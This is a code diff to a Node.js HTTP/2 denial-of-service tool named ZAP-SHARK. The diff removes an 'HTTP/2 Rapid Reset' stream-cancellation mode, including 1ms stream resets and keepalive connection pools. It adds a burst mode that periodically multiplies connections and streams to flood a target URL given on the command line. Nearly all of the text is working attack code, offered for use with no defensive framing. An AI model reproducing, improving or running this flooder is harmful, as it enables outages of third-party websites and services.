@@ -2,11 +2,11 @@ const http2 = require('http2');
 const os = require('os');
 const { exec } = require('child_process');
 
-class ZAPSHARK {
+class ZAPSHARK_V2 {
     constructor(targetUrl) {
         this.targetUrl = targetUrl;
-        this.hostname = new URL(targetUrl).hostname;
         this.status = "ATTACKING";
+        this.mode = "NORMAL"; // "NORMAL" or "BURST"
         this.totalRequests = 0;
         this.currentRPS = 0;
         this.startTime = Date.now();
@@ -14,135 +14,205 @@ class ZAPSHARK {
         this.lastRpsCalc = Date.now();
         this.running = true;
         
-        // RAPID RESET + KEEPALIVE OPTIMIZATION
-        this.connectionPool = [];
-        this.poolSize = 3; // Fewer but persistent connections
-        this.maxStreamsPerConn = 1000; // H2 max
+        // Connection Pools for different modes
+        this.normalPool = [];
+        this.burstPool = [];
+        this.activePool = this.normalPool;
+        
+        // Mode Settings
+        this.burstActive = false;
+        this.burstStartTime = 0;
+        this.lastBurstCycle = Date.now();
+        this.burstCycleInterval = 30000 + Math.random() * 30000; // 30-60s random
+        
+        // Pool sizes
+        this.normalPoolSize = 5;
+        this.burstPoolSize = 15; // 3x more connections in burst
+        
+        // Stream limits
+        this.normalStreamsPerConn = 50;
+        this.burstStreamsPerConn = 200; // 4x more streams in burst
+        
         this.activeStreams = 0;
-        this.rapidResetMode = true;
         
         // Maintenance
         this.lastMaintenance = Date.now();
-        this.maintenanceInterval = 3600000;
-        this.maintenanceDuration = 600000;
         
         this.attackInterval = null;
-        this.statsInterval = null;
+        this.burstCheckInterval = null;
     }
 
-    async setupConnections() {
-        for (let i = 0; i < this.poolSize; i++) {
+    setupNormalConnections() {
+        for (let i = 0; i < this.normalPoolSize; i++) {
+            setTimeout(() => {
+                try {
+                    const client = http2.connect(this.targetUrl, {
+                        maxSessionMemory: 8192
+                    });
+                    client.setMaxListeners(50);
+                    this.normalPool.push(client);
+                } catch (err) {}
+            }, i * 200);
+        }
+    }
+
+    setupBurstConnections() {
+        // Destroy old burst pool
+        this.burstPool.forEach(client => {
+            try { client.destroy(); } catch (err) {}
+        });
+        this.burstPool = [];
+        
+        // Create aggressive burst connections
+        for (let i = 0; i < this.burstPoolSize; i++) {
             try {
                 const client = http2.connect(this.targetUrl, {
-                    maxSessionMemory: 65536,
-                    maxDeflateDynamicTableSize: 65536,
+                    maxSessionMemory: 32768, // 4x memory
+                    maxDeflateDynamicTableSize: 4294967295,
                     peerMaxConcurrentStreams: 1000
                 });
+                client.setMaxListeners(500);
                 
-                // KEEPALIVE: Keep connection alive forever
-                client.socket.setKeepAlive(true, 60000);
-                client.socket.setNoDelay(true);
-                
-                client.on('connect', () => {
-                    console.log(`[+] H2 Connection ${i+1} established (KeepAlive)`);
+                // Aggressive settings for burst
+                client.settings({
+                    enablePush: false,
+                    initialWindowSize: 6291456, // 6MB window
+                    maxConcurrentStreams: 1000
                 });
                 
-                client.on('error', (err) => {
-                    // Silent reconnect
-                    setTimeout(() => this.createSingleConnection(), 1000);
-                });
-                
-                client.on('goaway', () => {
-                    // Server sent goaway, recreate
-                    setTimeout(() => this.createSingleConnection(), 500);
-                });
-                
-                this.connectionPool.push(client);
-                
-                // Stagger connections
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
+                this.burstPool.push(client);
             } catch (err) {
-                // Continue silently
+                // Quick retry on burst
+                if (this.burstPool.length < 5) {
+                    setTimeout(() => this.setupBurstConnections(), 100);
+                }
             }
         }
     }
 
-    createSingleConnection() {
-        try {
-            const client = http2.connect(this.targetUrl, {
-                peerMaxConcurrentStreams: 1000
-            });
-            client.socket.setKeepAlive(true, 60000);
-            client.socket.setNoDelay(true);
-            client.on('error', () => {});
-            this.connectionPool.push(client);
-        } catch (err) {}
-    }
-
     sendRequest() {
-        if (this.connectionPool.length === 0) return;
+        const pool = this.burstActive ? this.burstPool : this.normalPool;
+        if (pool.length === 0) return;
 
-        // Use all available connections
-        const connections = this.connectionPool.length;
-        const streamsPerTick = Math.min(100, connections * 10); // Aggressive but safe
+        const streamsPerConn = this.burstActive ? this.burstStreamsPerConn : this.normalStreamsPerConn;
+        const maxStreams = streamsPerConn * pool.length;
+        const availableStreams = maxStreams - this.activeStreams;
         
-        for (let i = 0; i < streamsPerTick; i++) {
-            const client = this.connectionPool[i % connections];
+        // BURST mode sends 10x more streams per tick
+        const streamsThisTick = this.burstActive ? 
+            Math.min(availableStreams, 30) : // BURST: 30 streams/tick
+            Math.min(availableStreams, 3);   // NORMAL: 3 streams/tick
+        
+        for (let i = 0; i < streamsThisTick; i++) {
+            const client = pool[Math.floor(Math.random() * pool.length)];
             if (!client) continue;
 
             try {
                 this.activeStreams++;
                 
-                // Create stream
-                const stream = client.request({
+                // Different settings for burst
+                const headers = this.burstActive ? {
                     ':method': 'GET',
-                    ':path': '/?' + Math.random().toString(36).substr(2),
-                    ':authority': this.hostname,
-                    'user-agent': 'Mozilla/5.0',
-                    'accept': '*/*'
+                    ':path': '/?' + Date.now() + Math.random(),
+                    'cache-control': 'no-cache, no-store, must-revalidate',
+                    'pragma': 'no-cache'
+                } : {
+                    ':method': 'GET',
+                    ':path': '/'
+                };
+                
+                const req = client.request(headers);
+                
+                req.on('response', () => {
+                    req.destroy();
                 });
                 
-                // RAPID RESET: Cancel immediately
-                if (this.rapidResetMode) {
-                    // Send request then immediately reset
-                    stream.end();
-                    
-                    // Cancel after 1ms (before server responds)
-                    setTimeout(() => {
-                        try {
-                            stream.close(http2.constants.NGHTTP2_CANCEL);
-                        } catch (err) {
-                            // Stream already closed
-                        }
-                        this.activeStreams--;
-                        this.totalRequests++;
-                        this.requestsSinceLastCalc++;
-                    }, 1); // 1ms delay for reset
-                    
-                } else {
-                    // Normal mode (for comparison)
-                    stream.on('response', () => {
-                        stream.destroy();
-                        this.activeStreams--;
-                        this.totalRequests++;
-                        this.requestsSinceLastCalc++;
-                    });
-                    
-                    stream.on('error', () => {
-                        this.activeStreams--;
-                        this.totalRequests++;
-                        this.requestsSinceLastCalc++;
-                    });
-                    
-                    stream.end();
-                }
+                req.on('error', () => {
+                    req.destroy();
+                });
+                
+                req.on('close', () => {
+                    this.activeStreams--;
+                    this.totalRequests++;
+                    this.requestsSinceLastCalc++;
+                });
+                
+                req.end();
                 
             } catch (err) {
                 this.activeStreams--;
                 this.totalRequests++;
                 this.requestsSinceLastCalc++;
             }
+        }
+    }
+
+    // BURST CYCLE CONTROL
+    checkBurstCycle() {
+        const now = Date.now();
+        const timeSinceLastBurst = now - this.lastBurstCycle;
+        
+        // Time for next burst?
+        if (timeSinceLastBurst >= this.burstCycleInterval && !this.burstActive) {
+            this.activateBurstMode();
+        }
+        
+        // Burst duration exceeded?
+        if (this.burstActive && (now - this.burstStartTime) >= 7000) { // 7 seconds
+            this.deactivateBurstMode();
+        }
+    }
+
+    activateBurstMode() {
+        console.log('\n[!] BURST MODE ACTIVATED - MAX RPS FOR 7s [!]');
+        this.mode = "BURST";
+        this.burstActive = true;
+        this.burstStartTime = Date.now();
+        
+        // Prepare burst connections
+        this.setupBurstConnections();
+        
+        // Switch to burst pool
+        this.activePool = this.burstPool;
+        
+        // Increase attack frequency for burst
+        if (this.attackInterval) {
+            clearInterval(this.attackInterval);
+            this.attackInterval = setInterval(() => {
+                if (this.status === "ATTACKING") {
+                    this.sendRequest();
+                    this.updateDisplay();
+                }
+            }, 0.05); // 2x faster in burst
+        }
+    }
+
+    deactivateBurstMode() {
+        console.log('\n[~] Returning to normal mode...');
+        this.mode = "NORMAL";
+        this.burstActive = false;
+        this.lastBurstCycle = Date.now();
+        this.burstCycleInterval = 30000 + Math.random() * 30000; // New random interval
+        
+        // Clean up burst connections
+        setTimeout(() => {
+            this.burstPool.forEach(client => {
+                try { client.destroy(); } catch (err) {}
+            });
+            this.burstPool = [];
+        }, 1000);
+        
+        this.activePool = this.normalPool;
+        
+        // Return to normal speed
+        if (this.attackInterval) {
+            clearInterval(this.attackInterval);
+            this.attackInterval = setInterval(() => {
+                if (this.status === "ATTACKING") {
+                    this.sendRequest();
+                    this.updateDisplay();
+                }
+            }, 0.1);
         }
     }
 
@@ -167,133 +237,72 @@ class ZAPSHARK {
     updateDisplay() {
         this.calculateRPS();
         
-        const mode = this.rapidResetMode ? '[RAPID-RESET]' : '[NORMAL]';
-        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
+        const modeIndicator = this.burstActive ? "🔥BURST" : "NORMAL";
+        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) | ${modeIndicator} | ` +
                            `TOTAL: ${this.totalRequests} | ` +
-                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
-                           `${mode} CONNS: ${this.connectionPool.length}`);
+                           `RPS: ${this.currentRPS.toFixed(1)}`);
     }
 
-    flushDNS() {
-        if (os.platform() === 'win32') {
-            exec('ipconfig /flushdns >nul 2>&1', () => {});
-        } else {
-            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
-        }
-    }
-
-    flushSockets() {
-        // Close connections but maintain pool size
-        this.connectionPool.forEach(client => {
-            try {
-                client.destroy();
-            } catch (err) {}
-        });
-        this.connectionPool = [];
-        this.activeStreams = 0;
-        
-        // Recreate connections
-        setTimeout(() => this.setupConnections(), 1000);
-    }
-
+    // Maintenance (simplified for V2)
     checkMaintenance() {
         const currentTime = Date.now();
-        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
-        
-        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
-            console.log('\n⚡ MAINTENANCE STARTED (10min)');
+        if (currentTime - this.lastMaintenance >= 3600000) {
             this.status = "PAUSED";
+            clearInterval(this.attackInterval);
             
-            if (this.attackInterval) {
-                clearInterval(this.attackInterval);
-                this.attackInterval = null;
-            }
-            
-            this.flushDNS();
-            this.flushSockets();
+            exec('ipconfig /flushdns >nul 2>&1 || true', () => {});
             
             setTimeout(() => {
                 this.status = "ATTACKING";
                 this.lastMaintenance = Date.now();
-                console.log('⚡ MAINTENANCE COMPLETED - RAPID RESET ENGAGED');
-                this.startAttack();
-            }, this.maintenanceDuration);
+            }, 600000);
         }
     }
 
-    startAttack() {
-        if (this.attackInterval) {
-            clearInterval(this.attackInterval);
-        }
-        
-        // ULTRA FAST INTERVAL for rapid reset
-        this.attackInterval = setInterval(() => {
-            if (this.status === "ATTACKING") {
-                // Send in bursts for max RPS
-                for (let burst = 0; burst < 5; burst++) {
-                    this.sendRequest();
-                }
-                this.updateDisplay();
-            }
-        }, 0.05); // 20,000 iterations/sec
-    }
-
-    async start() {
-        console.log("=".repeat(50));
-        console.log("🦈 ZAP-SHARK V2 - RAPID RESET EDITION");
-        console.log("=".repeat(50));
+    start() {
+        console.log("=== ZAP-SHARK V2 - BURST MODE ===");
         console.log("Target:", this.targetUrl);
-        console.log("Mode: HTTP/2 Rapid Reset + KeepAlive");
-        console.log("Expected RPS: 50,000+");
+        console.log("Burst: Every 30-60s for 7s");
         console.log("=".repeat(50));
         
-        await this.setupConnections();
+        this.setupNormalConnections();
         
-        // Wait for connections
         setTimeout(() => {
-            this.startAttack();
-        }, 3000);
+            this.attackInterval = setInterval(() => {
+                if (this.status === "ATTACKING") {
+                    this.sendRequest();
+                    this.updateDisplay();
+                }
+            }, 0.1);
+            
+            // Burst cycle checker
+            this.burstCheckInterval = setInterval(() => {
+                this.checkBurstCycle();
+            }, 1000);
+            
+            // Maintenance checker
+            setInterval(() => {
+                this.checkMaintenance();
+            }, 10000);
+            
+        }, 2000);
         
-        // Maintenance checker
-        setInterval(() => {
-            this.checkMaintenance();
-        }, 1000);
-        
-        // Connection health monitor
-        setInterval(() => {
-            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
-                this.createSingleConnection();
-            }
-        }, 5000);
-        
-        // Stats display
-        this.statsInterval = setInterval(() => {
-            if (this.status === "ATTACKING") {
-                console.log(`\n📊 STATS: ${this.currentRPS.toFixed(0)} RPS | Connections: ${this.connectionPool.length} | Total: ${this.totalRequests}`);
-            }
-        }, 10000);
-        
-        process.on('SIGINT', () => this.stop());
-    }
-
-    stop() {
-        this.running = false;
-        if (this.attackInterval) clearInterval(this.attackInterval);
-        if (this.statsInterval) clearInterval(this.statsInterval);
-        this.connectionPool.forEach(client => {
-            try { client.destroy(); } catch (err) {}
+        process.on('SIGINT', () => {
+            this.running = false;
+            clearInterval(this.attackInterval);
+            clearInterval(this.burstCheckInterval);
+            console.log('\n=== ZAP-SHARK V2 STOPPED ===');
+            process.exit(0);
         });
-        console.log('\n\n🦈 ZAP-SHARK TERMINATED');
-        process.exit(0);
     }
 }
 
-// CLI
+// Usage
 const target = process.argv[2];
-if (!target || !target.startsWith('https://')) {
+if (!target) {
     console.log('Usage: node zap-shark-v2.js https://target.com');
     process.exit(1);
 }
 
-const shark = new ZAPSHARK(target);
-shark.start().catch(console.error);
+const shark = new ZAPSHARK_V2(target);
+shark.start();
